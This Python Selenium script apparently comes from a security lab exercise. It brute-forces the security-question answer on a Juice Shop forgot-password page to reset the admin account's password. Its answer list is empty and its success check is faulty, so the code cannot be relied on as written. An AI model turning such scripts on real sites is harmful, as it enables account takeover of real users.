from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.wait import WebDriverWait

# go to log in webpage
driver = webdriver.Edge()
driver.get("http://192.168.6.25:3000/#/forgot-password")

# retrieve username location
username = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-forgot-password/div/mat-card/div[3]/mat-form-field/div/div[1]/div[3]/input")

# retrieve password location
answer = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-forgot-password/div/mat-card/div[4]/mat-form-field[1]/div/div[1]/div[3]/input")
# retrieve button location
button = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-forgot-password/div/mat-card/button[1]")

password1 = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-forgot-password/div/mat-card/div[4]/mat-form-field[2]/div/div[1]/div[3]/input")
password2 = driver.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-forgot-password/div/mat-card/div[4]/mat-form-field[3]/div/div[1]/div[3]/input")

# retrieve list of passwords (the last password is my real password
answer_list = ()

y = ""
# loop through password options
for x in answer_list:
    y = x
    username.send_keys("admin@juice-sh.op")
    WebDriverWait(driver, 20).until(ec.element_to_be_clickable(answer))
    answer.send_keys(x)
    password1.send_keys("hello")
    password2.send_keys("hello")
    driver.execute_script("arguments[0].click();", button)
    if ec.presence_of_element_located("/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-forgot-password/div/mat-card/div[3]/mat-form-field/div/div[1]/div[3]/input"):
        username.clear()
        answer.clear()
        password1.clear()
        password2.clear()
    else:
        break

print(y)

# tell driver to wait until webpage gives an alert (it never will), this is so progress can be observed
WebDriverWait(driver, 200).until(ec.alert_is_present(), "done")